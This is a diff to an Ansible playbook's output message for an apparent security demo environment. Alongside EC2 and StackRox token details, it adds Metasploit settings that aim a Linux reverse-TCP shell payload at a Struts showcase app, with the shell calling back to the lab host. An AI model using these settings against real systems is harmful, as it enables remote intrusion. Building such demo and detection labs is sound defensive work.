@@ -7,9 +7,9 @@
   tasks:
     - debug:
         msg: |
-          #####################
+          #######################
           # EC2 Instance
-          #####################
+          #######################
 
           Public IP:  {{ ec2_instance.instances.0.public_ip_address }}
           Public DNS: {{ ec2_instance.instances.0.public_dns_name }}
@@ -17,9 +17,20 @@
           To access the instance:
             ssh ec2-user@{{ ec2_instance.instances.0.public_dns_name }}
 
-          #####################
+          #######################
+          # Metasploit variables
+          #######################
+
+          set RHOST http://{{ struts_route.stdout }}
+          set RPORT 80
+          set LHOST {{ ec2_instance.instances.0.public_dns_name }}
+          set PAYLOAD linux/x64/shell/reverse_tcp
+          set LPORT 5432
+          set TARGETURI /showcase
+
+          #######################
           # Stackrox API Token
-          #####################
+          #######################
 
           Run the following command to add the token to your environment variables:
 
